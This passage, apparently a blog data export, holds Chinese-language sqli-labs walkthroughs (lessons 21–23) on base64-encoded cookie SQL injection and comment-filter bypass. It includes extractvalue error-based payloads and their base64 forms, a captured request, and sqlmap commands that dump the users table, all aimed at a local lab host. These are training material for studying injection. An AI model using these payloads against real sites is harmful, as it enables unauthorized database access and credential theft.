注入过程\n\n这一课从标题就可以发现其实和Lesson-20一样。以admin账户登入后发现本地的Cookie被加密了。\n\n![2](/img/sql/Lesson-21/002.png)\n\n加密方式是base64,通过burpsuite可以解密。\n\n![3](/img/sql/Lesson-21/003.png)\n\n所以伪造的恶意Cookie需要通过base64加密。这里故意加`'`\n\n![4](/img/sql/Lesson-21/004.png)\n\n刷新页面,用burpsuite抓包,修改Cookie。\n\n![5](/img/sql/Lesson-21/005.png)\n\n`admin')#`的base64编码为`YWRtaW4nKSM=`\n\n![6](/img/sql/Lesson-21/006.png)\n\n确认使用`')`闭合\n\npayload:\n\n`admin') and extractvalue(null,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name = 'users'),0x7e))#`\n\n对应的base64编码\n\n`YWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKG51bGwsY29uY2F0KDB4N2UsKHNlbGVjdCBncm91cF9jb25jYXQoY29sdW1uX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgd2hlcmUgdGFibGVfbmFtZSA9ICd1c2VycycpLDB4N2UpKSM=`\n\n![7](/img/sql/Lesson-21/007.png)\n\n## SQLMAP\n\n这次是在Ubuntu下用的SQLMAP\n\n先用Burpsuite像上一课一样抓包,修改如下\n\n```\nGET /sql/Less-21/index.php HTTP/1.1\nHost: 192.168.75.131\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: http://192.168.75.131/sql/Less-21/index.php\nCookie: uname=YWRtaW4%3D*\nConnection: close\nUpgrade-Insecure-Requests: 1\nCache-Control: max-age=0\n```\n\n\n\n```\n--dbms 指定后端数据库\n--technique E 指定注入类型为报错注入\n--threads 10 指定并发线程数\n--level 2 指定检测等级,等级2包括Cookie\n--tamper base64encode.py 指定脚本为对base64encode.py(它会对payload进行base64加密)\n--flush-session 刷新session\n--fresh-queries 建立新的查询\n```\n\n`python sqlmap.py -r ../post/post_21.txt --dbms mysql --technique E --threads 10 --level 2 --tamper base64encode.py --flush-session --fresh-queries`\n\n![8](/img/sql/Lesson-21/008.png)\n\n获得payload:\n\n![9](/img/sql/Lesson-21/009.png)\n\n`python sqlmap.py -r ../post/post_21.txt --dbms mysql --technique E --threads 10 --level 2 --tamper base64encode.py -D security -T users --columns --dump`\n\n![10](/img/sql/Lesson-21/010.png)\n\n\n","source":"_posts/sqli-labs-lession-21-base64编码单引号和括号的Cookie注入.md","raw":"---\ntitle: sqli-labs-lession 21 base64编码单引号和括号的Cookie注入\ndate: 2018-10-02 19:58:34\ntags: [sqli-labs]\ncategories: sql注入\n---\n\n# sqli-labs-lession 21 base64编码单引号和括号的Cookie注入\n\n---\n\n## 登录界面\n\n![1](/img/sql/Lesson-21/001.png)\n\n## 注入过程\n\n这一课从标题就可以发现其实和Lesson-20一样。以admin账户登入后发现本地的Cookie被加密了。\n\n![2](/img/sql/Lesson-21/002.png)\n\n加密方式是base64,通过burpsuite可以解密。\n\n![3](/img/sql/Lesson-21/003.png)\n\n所以伪造的恶意Cookie需要通过base64加密。这里故意加`'`\n\n![4](/img/sql/Lesson-21/004.png)\n\n刷新页面,用burpsuite抓包,修改Cookie。\n\n![5](/img/sql/Lesson-21/005.png)\n\n`admin')#`的base64编码为`YWRtaW4nKSM=`\n\n![6](/img/sql/Lesson-21/006.png)\n\n确认使用`')`闭合\n\npayload:\n\n`admin') and extractvalue(null,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name = 'users'),0x7e))#`\n\n对应的base64编码\n\n`YWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKG51bGwsY29uY2F0KDB4N2UsKHNlbGVjdCBncm91cF9jb25jYXQoY29sdW1uX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgd2hlcmUgdGFibGVfbmFtZSA9ICd1c2VycycpLDB4N2UpKSM=`\n\n![7](/img/sql/Lesson-21/007.png)\n\n## SQLMAP\n\n这次是在Ubuntu下用的SQLMAP\n\n先用Burpsuite像上一课一样抓包,修改如下\n\n```\nGET /sql/Less-21/index.php HTTP/1.1\nHost: 192.168.75.131\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: http://192.168.75.131/sql/Less-21/index.php\nCookie: uname=YWRtaW4%3D*\nConnection: close\nUpgrade-Insecure-Requests: 1\nCache-Control: max-age=0\n```\n\n\n\n```\n--dbms 指定后端数据库\n--technique E 指定注入类型为报错注入\n--threads 10 指定并发线程数\n--level 2 指定检测等级,等级2包括Cookie\n--tamper base64encode.py 指定脚本为对base64encode.py(它会对payload进行base64加密)\n--flush-session 刷新session\n--fresh-queries 建立新的查询\n```\n\n`python sqlmap.py -r ../post/post_21.txt --dbms mysql --technique E --threads 10 --level 2 --tamper base64encode.py --flush-session --fresh-queries`\n\n![8](/img/sql/Lesson-21/008.png)\n\n获得payload:\n\n![9](/img/sql/Lesson-21/009.png)\n\n`python sqlmap.py -r ../post/post_21.txt --dbms mysql --technique E --threads 10 --level 2 --tamper base64encode.py -D security -T users --columns --dump`\n\n![10](/img/sql/Lesson-21/010.png)\n\n\n","slug":"sqli-labs-lession-21-base64编码单引号和括号的Cookie注入","published":1,"updated":"2019-06-19T17:23:13.387Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istd4002p4dsb7iu3r3c2","content":"<h1 id=\"sqli-labs-lession-21-base64编码单引号和括号的Cookie注入\"><a href=\"#sqli-labs-lession-21-base64编码单引号和括号的Cookie注入\" class=\"headerlink\" title=\"sqli-labs-lession 21 base64编码单引号和括号的Cookie注入\"></a>sqli-labs-lession 21 base64编码单引号和括号的Cookie注入</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-21/001.png\" alt=\"1\"></p>\n<h2 id=\"注入过程\"><a href=\"#注入过程\" class=\"headerlink\" title=\"注入过程\"></a>注入过程</h2><p>这一课从标题就可以发现其实和Lesson-20一样。以admin账户登入后发现本地的Cookie被加密了。</p>\n<p><img src=\"/img/sql/Lesson-21/002.png\" alt=\"2\"></p>\n<p>加密方式是base64,通过burpsuite可以解密。</p>\n<p><img src=\"/img/sql/Lesson-21/003.png\" alt=\"3\"></p>\n<p>所以伪造的恶意Cookie需要通过base64加密。这里故意加<code>&#39;</code></p>\n<p><img src=\"/img/sql/Lesson-21/004.png\" alt=\"4\"></p>\n<p>刷新页面,用burpsuite抓包,修改Cookie。</p>\n<p><img src=\"/img/sql/Lesson-21/005.png\" alt=\"5\"></p>\n<p><code>admin&#39;)#</code>的base64编码为<code>YWRtaW4nKSM=</code></p>\n<p><img src=\"/img/sql/Lesson-21/006.png\" alt=\"6\"></p>\n<p>确认使用<code>&#39;)</code>闭合</p>\n<p>payload:</p>\n<p><code>admin&#39;) and extractvalue(null,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name = &#39;users&#39;),0x7e))#</code></p>\n<p>对应的base64编码</p>\n<p><code>YWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKG51bGwsY29uY2F0KDB4N2UsKHNlbGVjdCBncm91cF9jb25jYXQoY29sdW1uX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgd2hlcmUgdGFibGVfbmFtZSA9ICd1c2VycycpLDB4N2UpKSM=</code></p>\n<p><img src=\"/img/sql/Lesson-21/007.png\" alt=\"7\"></p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p>这次是在Ubuntu下用的SQLMAP</p>\n<p>先用Burpsuite像上一课一样抓包,修改如下</p>\n<figure class=\"highlight groovy\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET <span class=\"regexp\">/sql/</span>Less<span class=\"number\">-21</span><span class=\"regexp\">/index.php HTTP/</span><span class=\"number\">1.1</span></span><br><span class=\"line\"><span class=\"string\">Host:</span> <span class=\"number\">192.168</span><span class=\"number\">.75</span><span class=\"number\">.131</span></span><br><span class=\"line\">User-<span class=\"string\">Agent:</span> Mozilla<span class=\"regexp\">/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/</span><span class=\"number\">20100101</span> Firefox/<span class=\"number\">62.0</span></span><br><span class=\"line\"><span class=\"string\">Accept:</span> text<span class=\"regexp\">/html,application/</span>xhtml+xml,application<span class=\"regexp\">/xml;q=0.9,*/</span>*;q=<span class=\"number\">0.8</span></span><br><span class=\"line\">Accept-<span class=\"string\">Language:</span> en-US,en;q=<span class=\"number\">0.5</span></span><br><span class=\"line\">Accept-<span class=\"string\">Encoding:</span> gzip, deflate</span><br><span class=\"line\"><span class=\"string\">Referer:</span> <span class=\"string\">http:</span><span class=\"comment\">//192.168.75.131/sql/Less-21/index.php</span></span><br><span class=\"line\"><span class=\"string\">Cookie:</span> uname=YWRtaW4%<span class=\"number\">3</span>D*</span><br><span class=\"line\"><span class=\"string\">Connection:</span> close</span><br><span class=\"line\">Upgrade-Insecure-<span class=\"string\">Requests:</span> <span class=\"number\">1</span></span><br><span class=\"line\">Cache-<span class=\"string\">Control:</span> max-age=<span class=\"number\">0</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight ada\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">--dbms 指定后端数据库</span></span><br><span class=\"line\"><span class=\"comment\">--technique E 指定注入类型为报错注入</span></span><br><span class=\"line\"><span class=\"comment\">--threads 10 指定并发线程数</span></span><br><span class=\"line\"><span class=\"comment\">--level 2 指定检测等级,等级2包括Cookie</span></span><br><span class=\"line\"><span class=\"comment\">--tamper base64encode.py 指定脚本为对base64encode.py(它会对payload进行base64加密)</span></span><br><span class=\"line\"><span class=\"comment\">--flush-session 刷新session</span></span><br><span class=\"line\"><span class=\"comment\">--fresh-queries 建立新的查询</span></span><br></pre></td></tr></table></figure>\n\n<p><code>python sqlmap.py -r ../post/post_21.txt --dbms mysql --technique E --threads 10 --level 2 --tamper base64encode.py --flush-session --fresh-queries</code></p>\n<p><img src=\"/img/sql/Lesson-21/008.png\" alt=\"8\"></p>\n<p>获得payload:</p>\n<p><img src=\"/img/sql/Lesson-21/009.png\" alt=\"9\"></p>\n<p><code>python sqlmap.py -r ../post/post_21.txt --dbms mysql --technique E --threads 10 --level 2 --tamper base64encode.py -D security -T users --columns --dump</code></p>\n<p><img src=\"/img/sql/Lesson-21/010.png\" alt=\"10\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-21-base64编码单引号和括号的Cookie注入\"><a href=\"#sqli-labs-lession-21-base64编码单引号和括号的Cookie注入\" class=\"headerlink\" title=\"sqli-labs-lession 21 base64编码单引号和括号的Cookie注入\"></a>sqli-labs-lession 21 base64编码单引号和括号的Cookie注入</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-21/001.png\" alt=\"1\"></p>\n<h2 id=\"注入过程\"><a href=\"#注入过程\" class=\"headerlink\" title=\"注入过程\"></a>注入过程</h2><p>这一课从标题就可以发现其实和Lesson-20一样。以admin账户登入后发现本地的Cookie被加密了。</p>\n<p><img src=\"/img/sql/Lesson-21/002.png\" alt=\"2\"></p>\n<p>加密方式是base64,通过burpsuite可以解密。</p>\n<p><img src=\"/img/sql/Lesson-21/003.png\" alt=\"3\"></p>\n<p>所以伪造的恶意Cookie需要通过base64加密。这里故意加<code>&#39;</code></p>\n<p><img src=\"/img/sql/Lesson-21/004.png\" alt=\"4\"></p>\n<p>刷新页面,用burpsuite抓包,修改Cookie。</p>\n<p><img src=\"/img/sql/Lesson-21/005.png\" alt=\"5\"></p>\n<p><code>admin&#39;)#</code>的base64编码为<code>YWRtaW4nKSM=</code></p>\n<p><img src=\"/img/sql/Lesson-21/006.png\" alt=\"6\"></p>\n<p>确认使用<code>&#39;)</code>闭合</p>\n<p>payload:</p>\n<p><code>admin&#39;) and extractvalue(null,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name = &#39;users&#39;),0x7e))#</code></p>\n<p>对应的base64编码</p>\n<p><code>YWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKG51bGwsY29uY2F0KDB4N2UsKHNlbGVjdCBncm91cF9jb25jYXQoY29sdW1uX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgd2hlcmUgdGFibGVfbmFtZSA9ICd1c2VycycpLDB4N2UpKSM=</code></p>\n<p><img src=\"/img/sql/Lesson-21/007.png\" alt=\"7\"></p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p>这次是在Ubuntu下用的SQLMAP</p>\n<p>先用Burpsuite像上一课一样抓包,修改如下</p>\n<figure class=\"highlight groovy\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET <span class=\"regexp\">/sql/</span>Less<span class=\"number\">-21</span><span class=\"regexp\">/index.php HTTP/</span><span class=\"number\">1.1</span></span><br><span class=\"line\"><span class=\"string\">Host:</span> <span class=\"number\">192.168</span><span class=\"number\">.75</span><span class=\"number\">.131</span></span><br><span class=\"line\">User-<span class=\"string\">Agent:</span> Mozilla<span class=\"regexp\">/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/</span><span class=\"number\">20100101</span> Firefox/<span class=\"number\">62.0</span></span><br><span class=\"line\"><span class=\"string\">Accept:</span> text<span class=\"regexp\">/html,application/</span>xhtml+xml,application<span class=\"regexp\">/xml;q=0.9,*/</span>*;q=<span class=\"number\">0.8</span></span><br><span class=\"line\">Accept-<span class=\"string\">Language:</span> en-US,en;q=<span class=\"number\">0.5</span></span><br><span class=\"line\">Accept-<span class=\"string\">Encoding:</span> gzip, deflate</span><br><span class=\"line\"><span class=\"string\">Referer:</span> <span class=\"string\">http:</span><span class=\"comment\">//192.168.75.131/sql/Less-21/index.php</span></span><br><span class=\"line\"><span class=\"string\">Cookie:</span> uname=YWRtaW4%<span class=\"number\">3</span>D*</span><br><span class=\"line\"><span class=\"string\">Connection:</span> close</span><br><span class=\"line\">Upgrade-Insecure-<span class=\"string\">Requests:</span> <span class=\"number\">1</span></span><br><span class=\"line\">Cache-<span class=\"string\">Control:</span> max-age=<span class=\"number\">0</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight ada\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">--dbms 指定后端数据库</span></span><br><span class=\"line\"><span class=\"comment\">--technique E 指定注入类型为报错注入</span></span><br><span class=\"line\"><span class=\"comment\">--threads 10 指定并发线程数</span></span><br><span class=\"line\"><span class=\"comment\">--level 2 指定检测等级,等级2包括Cookie</span></span><br><span class=\"line\"><span class=\"comment\">--tamper base64encode.py 指定脚本为对base64encode.py(它会对payload进行base64加密)</span></span><br><span class=\"line\"><span class=\"comment\">--flush-session 刷新session</span></span><br><span class=\"line\"><span class=\"comment\">--fresh-queries 建立新的查询</span></span><br></pre></td></tr></table></figure>\n\n<p><code>python sqlmap.py -r ../post/post_21.txt --dbms mysql --technique E --threads 10 --level 2 --tamper base64encode.py --flush-session --fresh-queries</code></p>\n<p><img src=\"/img/sql/Lesson-21/008.png\" alt=\"8\"></p>\n<p>获得payload:</p>\n<p><img src=\"/img/sql/Lesson-21/009.png\" alt=\"9\"></p>\n<p><code>python sqlmap.py -r ../post/post_21.txt --dbms mysql --technique E --threads 10 --level 2 --tamper base64encode.py -D security -T users --columns --dump</code></p>\n<p><img src=\"/img/sql/Lesson-21/010.png\" alt=\"10\"></p>\n"},{"title":"sqli-labs-lession 22 base64编码加密的双引号Cookie注入","date":"2018-10-03T03:33:38.000Z","_content":"\n# sqli-labs-lession 22 base64编码加密的双引号Cookie注入\n\n---\n\n## 登录界面\n\n![001](/img/sql/Lesson-22/001.png)\n\n## 注入\n\n看标题名字就知道只是变化了个引号,直接测试。\n\n`admin\"`的base64加密为`YWRtaW4i`\n\n![002](/img/sql/Lesson-22/002.png)\n\n其他都一样了,直接上payload\n\n```\nadmin\" and extractvalue(null,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name = 'users'),0x7e))#\n#对应加密\nYWRtaW4iIGFuZCBleHRyYWN0dmFsdWUobnVsbCxjb25jYXQoMHg3ZSwoc2VsZWN0IGdyb3VwX2NvbmNhdChjb2x1bW5fbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucyB3aGVyZSB0YWJsZV9uYW1lID0gJ3VzZXJzJyksMHg3ZSkpIw==\n```\n\n![003](/img/sql/Lesson-22/003.png)\n\n## SQLMAP\n\n也是一样的过程,先在firefox浏览器设置代理,在用Burpsuite抓到刷新界面的包,在Cookie处加个*,保存到文件。\n\n![004](/img/sql/Lesson-22/004.png)\n\n```\n--dbms 指定后端数据库\n--technique E 指定注入类型为报错注入\n--threads 10 指定并发线程数\n--level 2 指定检测等级,等级2包括Cookie\n--tamper base64encode.py 指定脚本为对base64encode.py(它会对payload进行base64加密)\n--flush-session 刷新session\n--fresh-queries 建立新的查询\n```\n\n`python sqlmap.py -r ../post/post_22.txt --dbms mysql --technique E --threads 10 --level 2 --tamper base64encode.py --flush-session --fresh-queries`\n\n![005](/img/sql/Lesson-22/005.png)\n\n![006](/img/sql/Lesson-22/006.png)\n\n`python sqlmap.py -r ../post/post_22.txt --dbms mysql --technique E --threads 10 --level 2 --tamper base64encode.py -D security -T users --columns --dump`\n\n![007](/img/sql/Lesson-22/007.png)\n\n","source":"_posts/sqli-labs-lession-22-base64编码加密的双引号Cookie注入.md","raw":"---\ntitle: sqli-labs-lession 22 base64编码加密的双引号Cookie注入\ndate: 2018-10-03 11:33:38\ntags: [sqli-labs]\ncategories: sql注入\n---\n\n# sqli-labs-lession 22 base64编码加密的双引号Cookie注入\n\n---\n\n## 登录界面\n\n![001](/img/sql/Lesson-22/001.png)\n\n## 注入\n\n看标题名字就知道只是变化了个引号,直接测试。\n\n`admin\"`的base64加密为`YWRtaW4i`\n\n![002](/img/sql/Lesson-22/002.png)\n\n其他都一样了,直接上payload\n\n```\nadmin\" and extractvalue(null,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name = 'users'),0x7e))#\n#对应加密\nYWRtaW4iIGFuZCBleHRyYWN0dmFsdWUobnVsbCxjb25jYXQoMHg3ZSwoc2VsZWN0IGdyb3VwX2NvbmNhdChjb2x1bW5fbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucyB3aGVyZSB0YWJsZV9uYW1lID0gJ3VzZXJzJyksMHg3ZSkpIw==\n```\n\n![003](/img/sql/Lesson-22/003.png)\n\n## SQLMAP\n\n也是一样的过程,先在firefox浏览器设置代理,在用Burpsuite抓到刷新界面的包,在Cookie处加个*,保存到文件。\n\n![004](/img/sql/Lesson-22/004.png)\n\n```\n--dbms 指定后端数据库\n--technique E 指定注入类型为报错注入\n--threads 10 指定并发线程数\n--level 2 指定检测等级,等级2包括Cookie\n--tamper base64encode.py 指定脚本为对base64encode.py(它会对payload进行base64加密)\n--flush-session 刷新session\n--fresh-queries 建立新的查询\n```\n\n`python sqlmap.py -r ../post/post_22.txt --dbms mysql --technique E --threads 10 --level 2 --tamper base64encode.py --flush-session --fresh-queries`\n\n![005](/img/sql/Lesson-22/005.png)\n\n![006](/img/sql/Lesson-22/006.png)\n\n`python sqlmap.py -r ../post/post_22.txt --dbms mysql --technique E --threads 10 --level 2 --tamper base64encode.py -D security -T users --columns --dump`\n\n![007](/img/sql/Lesson-22/007.png)\n\n","slug":"sqli-labs-lession-22-base64编码加密的双引号Cookie注入","published":1,"updated":"2019-06-19T17:23:13.388Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istd5002q4dsbnz0i0pvm","content":"<h1 id=\"sqli-labs-lession-22-base64编码加密的双引号Cookie注入\"><a href=\"#sqli-labs-lession-22-base64编码加密的双引号Cookie注入\" class=\"headerlink\" title=\"sqli-labs-lession 22 base64编码加密的双引号Cookie注入\"></a>sqli-labs-lession 22 base64编码加密的双引号Cookie注入</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-22/001.png\" alt=\"001\"></p>\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><p>看标题名字就知道只是变化了个引号,直接测试。</p>\n<p><code>admin&quot;</code>的base64加密为<code>YWRtaW4i</code></p>\n<p><img src=\"/img/sql/Lesson-22/002.png\" alt=\"002\"></p>\n<p>其他都一样了,直接上payload</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">admin\" and extractvalue(null,concat(0x7e,(<span class=\"keyword\">select</span> <span class=\"keyword\">group_concat</span>(column_name) <span class=\"keyword\">from</span> information_schema.columns <span class=\"keyword\">where</span> table_name = <span class=\"string\">'users'</span>),<span class=\"number\">0x7e</span>))<span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#对应加密</span></span><br><span class=\"line\">YWRtaW4iIGFuZCBleHRyYWN0dmFsdWUobnVsbCxjb25jYXQoMHg3ZSwoc2VsZWN0IGdyb3VwX2NvbmNhdChjb2x1bW5fbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucyB3aGVyZSB0YWJsZV9uYW1lID0gJ3VzZXJzJyksMHg3ZSkpIw==</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/sql/Lesson-22/003.png\" alt=\"003\"></p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p>也是一样的过程,先在firefox浏览器设置代理,在用Burpsuite抓到刷新界面的包,在Cookie处加个*,保存到文件。</p>\n<p><img src=\"/img/sql/Lesson-22/004.png\" alt=\"004\"></p>\n<figure class=\"highlight ada\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">--dbms 指定后端数据库</span></span><br><span class=\"line\"><span class=\"comment\">--technique E 指定注入类型为报错注入</span></span><br><span class=\"line\"><span class=\"comment\">--threads 10 指定并发线程数</span></span><br><span class=\"line\"><span class=\"comment\">--level 2 指定检测等级,等级2包括Cookie</span></span><br><span class=\"line\"><span class=\"comment\">--tamper base64encode.py 指定脚本为对base64encode.py(它会对payload进行base64加密)</span></span><br><span class=\"line\"><span class=\"comment\">--flush-session 刷新session</span></span><br><span class=\"line\"><span class=\"comment\">--fresh-queries 建立新的查询</span></span><br></pre></td></tr></table></figure>\n\n<p><code>python sqlmap.py -r ../post/post_22.txt --dbms mysql --technique E --threads 10 --level 2 --tamper base64encode.py --flush-session --fresh-queries</code></p>\n<p><img src=\"/img/sql/Lesson-22/005.png\" alt=\"005\"></p>\n<p><img src=\"/img/sql/Lesson-22/006.png\" alt=\"006\"></p>\n<p><code>python sqlmap.py -r ../post/post_22.txt --dbms mysql --technique E --threads 10 --level 2 --tamper base64encode.py -D security -T users --columns --dump</code></p>\n<p><img src=\"/img/sql/Lesson-22/007.png\" alt=\"007\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-22-base64编码加密的双引号Cookie注入\"><a href=\"#sqli-labs-lession-22-base64编码加密的双引号Cookie注入\" class=\"headerlink\" title=\"sqli-labs-lession 22 base64编码加密的双引号Cookie注入\"></a>sqli-labs-lession 22 base64编码加密的双引号Cookie注入</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-22/001.png\" alt=\"001\"></p>\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><p>看标题名字就知道只是变化了个引号,直接测试。</p>\n<p><code>admin&quot;</code>的base64加密为<code>YWRtaW4i</code></p>\n<p><img src=\"/img/sql/Lesson-22/002.png\" alt=\"002\"></p>\n<p>其他都一样了,直接上payload</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">admin\" and extractvalue(null,concat(0x7e,(<span class=\"keyword\">select</span> <span class=\"keyword\">group_concat</span>(column_name) <span class=\"keyword\">from</span> information_schema.columns <span class=\"keyword\">where</span> table_name = <span class=\"string\">'users'</span>),<span class=\"number\">0x7e</span>))<span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#对应加密</span></span><br><span class=\"line\">YWRtaW4iIGFuZCBleHRyYWN0dmFsdWUobnVsbCxjb25jYXQoMHg3ZSwoc2VsZWN0IGdyb3VwX2NvbmNhdChjb2x1bW5fbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucyB3aGVyZSB0YWJsZV9uYW1lID0gJ3VzZXJzJyksMHg3ZSkpIw==</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/sql/Lesson-22/003.png\" alt=\"003\"></p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p>也是一样的过程,先在firefox浏览器设置代理,在用Burpsuite抓到刷新界面的包,在Cookie处加个*,保存到文件。</p>\n<p><img src=\"/img/sql/Lesson-22/004.png\" alt=\"004\"></p>\n<figure class=\"highlight ada\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">--dbms 指定后端数据库</span></span><br><span class=\"line\"><span class=\"comment\">--technique E 指定注入类型为报错注入</span></span><br><span class=\"line\"><span class=\"comment\">--threads 10 指定并发线程数</span></span><br><span class=\"line\"><span class=\"comment\">--level 2 指定检测等级,等级2包括Cookie</span></span><br><span class=\"line\"><span class=\"comment\">--tamper base64encode.py 指定脚本为对base64encode.py(它会对payload进行base64加密)</span></span><br><span class=\"line\"><span class=\"comment\">--flush-session 刷新session</span></span><br><span class=\"line\"><span class=\"comment\">--fresh-queries 建立新的查询</span></span><br></pre></td></tr></table></figure>\n\n<p><code>python sqlmap.py -r ../post/post_22.txt --dbms mysql --technique E --threads 10 --level 2 --tamper base64encode.py --flush-session --fresh-queries</code></p>\n<p><img src=\"/img/sql/Lesson-22/005.png\" alt=\"005\"></p>\n<p><img src=\"/img/sql/Lesson-22/006.png\" alt=\"006\"></p>\n<p><code>python sqlmap.py -r ../post/post_22.txt --dbms mysql --technique E --threads 10 --level 2 --tamper base64encode.py -D security -T users --columns --dump</code></p>\n<p><img src=\"/img/sql/Lesson-22/007.png\" alt=\"007\"></p>\n"},{"title":"sqli-labs lession 23 GET基于错误的过滤注释","date":"2018-10-03T05:05:05.000Z","_content":"\n# sqli-labs lession 23 GET基于错误的过滤注释\n\n---\n\n## 登录界面\n\n![001](/img/sql/Lesson-23/001.png)\n\n## 分析\n\n这里对输入的`#`和`-- `的mysql注释方式进行了过滤。都替换成了空。\n\n![002](/img/sql/Lesson-23/002.png)\n\n用`'`发现报错,但是因为过滤了`#`和`-- `只能使用闭合绕过了。\n\n![003](/img/sql/Lesson-23/003.png)\n\n`http://192.168.75.131/sql/Less-23/?id=1' or '1'='1`\n\n![004](/img/sql/Lesson-23/004.png)\n\n## 手注\n\n### 获取字段数\n\n`http://192.168.75.131/sql/Less-23/?id=1' union select null,null,null or 